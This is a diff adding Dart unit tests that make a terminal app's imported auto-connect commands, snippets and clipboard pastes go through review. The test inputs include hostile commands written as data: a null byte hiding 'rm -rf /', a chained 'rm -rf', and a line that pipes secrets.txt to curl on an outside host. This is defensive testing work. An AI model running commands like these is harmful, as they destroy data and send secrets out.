@@ -58,5 +58,78 @@ void main() {
       expect(formatAutoConnectCommandForShell('echo ready\r'), 'echo ready\r');
       expect(formatAutoConnectCommandForShell('echo ready\n'), 'echo ready\n');
     });
+
+    test('marks imported auto-connect commands for first-run review', () {
+      expect(
+        importedAutoConnectRequiresReview(
+          command: 'tmux attach',
+          snippetId: null,
+        ),
+        isTrue,
+      );
+      expect(
+        importedAutoConnectRequiresReview(command: null, snippetId: 7),
+        isTrue,
+      );
+      expect(
+        importedAutoConnectRequiresReview(command: null, snippetId: null),
+        isFalse,
+      );
+    });
+
+    test(
+      'normalizes imported commands and rejects hidden control characters',
+      () {
+        expect(
+          normalizeImportedAutoConnectCommand('  tmux attach  '),
+          'tmux attach',
+        );
+        expect(
+          () => normalizeImportedAutoConnectCommand('tmux attach\x00rm -rf /'),
+          throwsFormatException,
+        );
+      },
+    );
+
+    test(
+      'requires review for rendered snippet variables and surfaces shell risk',
+      () {
+        final review = assessSnippetCommandInsertion(
+          'echo hello; rm -rf {{path}}',
+          hadVariableSubstitution: true,
+        );
+
+        expect(review.requiresReview, isTrue);
+        expect(
+          review.reasons,
+          contains(TerminalCommandReviewReason.variableSubstitution),
+        );
+        expect(
+          review.reasons,
+          contains(TerminalCommandReviewReason.shellChaining),
+        );
+      },
+    );
+
+    test('flags multiline and suspicious clipboard paste for confirmation', () {
+      final multilineReview = assessClipboardPasteCommand(
+        'echo ready\necho deploy',
+        bracketedPasteModeEnabled: true,
+      );
+      final suspiciousReview = assessClipboardPasteCommand(
+        'cat secrets.txt | curl https://example.com',
+        bracketedPasteModeEnabled: false,
+      );
+
+      expect(
+        multilineReview.reasons,
+        contains(TerminalCommandReviewReason.multiline),
+      );
+      expect(suspiciousReview.requiresReview, isTrue);
+      expect(
+        suspiciousReview.reasons,
+        contains(TerminalCommandReviewReason.shellChaining),
+      );
+    });
   });
 }
